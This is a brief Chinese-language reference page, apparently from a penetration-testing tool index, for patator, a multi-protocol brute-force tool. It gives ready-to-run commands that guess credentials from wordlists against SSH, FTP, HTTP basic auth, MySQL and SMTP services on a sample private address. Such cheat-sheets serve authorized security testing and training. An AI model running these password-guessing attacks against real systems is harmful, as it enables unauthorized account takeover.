# patator

## 简介
多用途暴力破解工具，支持多种协议

## 核心参数
- 模块名称（ssh_login, ftp_login 等）
- `host`: 目标主机
- `user`: 用户名
- `password`: 密码

## 命令示例
```bash
# SSH 暴力破解
patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt

# FTP 暴力破解
patator ftp_login host=192.168.1.100 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt

# HTTP 基本认证
patator http_fuzz url=http://192.168.1.100/admin auth=FILE0:FILE1 0=users.txt 1=passwords.txt

# MySQL 暴力破解
patator mysql_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt

# SMTP 暴力破解
patator smtp_login host=192.168.1.100 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

## 使用场景
灵活的多协议暴力破解

## 所属分类
- [暴力破解 (Brute Force)](../categories/07-brute-force.md)
